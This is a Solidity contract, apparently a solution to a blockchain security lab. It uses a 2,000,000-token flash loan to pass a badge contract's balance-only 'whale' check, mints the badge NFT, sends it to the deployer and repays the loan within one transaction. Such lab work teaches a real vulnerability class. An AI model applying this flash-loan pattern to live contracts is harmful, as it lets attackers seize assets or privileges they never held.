// SPDX-License-Identifier: MIT

import { IFlashLoanReceiver } from "./No2Flashloan.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.28;

interface ILoan {
    function flashloan(uint256 amount, bytes calldata params) external;
}

interface INo2WhaleOnlyBadge {

    function currentId() external view returns (uint256);
    function obtainProofOfWhale(uint256 _secret) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function balanceOf(address owner) external returns (uint256);

}

contract Lab2 is IFlashLoanReceiver{

    ILoan public flashloanContract;
    address private borrowerAddr;
    address public flashloanAddr;
    address public whaleAddr;
    address public tokenAddr;
    INo2WhaleOnlyBadge public No2WhaleOnlyBadge;

    constructor(address flashLoanAddress, address whaleAddress, address tokenAddress) {
        flashloanContract = ILoan(flashLoanAddress);
        flashloanAddr = flashLoanAddress;
        whaleAddr = whaleAddress;
        No2WhaleOnlyBadge = INo2WhaleOnlyBadge(whaleAddress);
        tokenAddr = tokenAddress;
        borrowerAddr = msg.sender;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external override {
        params = params;
        require(IERC20(token).balanceOf(address(this)) >= 1_000_000e18, "WHERE THE TOKEN");
        No2WhaleOnlyBadge.obtainProofOfWhale(1);
        require(No2WhaleOnlyBadge.balanceOf(address(this)) >= 1, "WHERE THE WHALE");

        No2WhaleOnlyBadge.transferFrom(address(this), borrowerAddr, No2WhaleOnlyBadge.currentId());
        require(IERC20(token).balanceOf(address(this)) >= 1_000_000e18, "TIME TO RETURN");
        IERC20(token).transfer(flashloanAddr, amount + fee);
    }

    function callLoan() public {
        bytes memory params = abi.encode("");
        flashloanContract.flashloan(2_000_000e18, params);
    }

}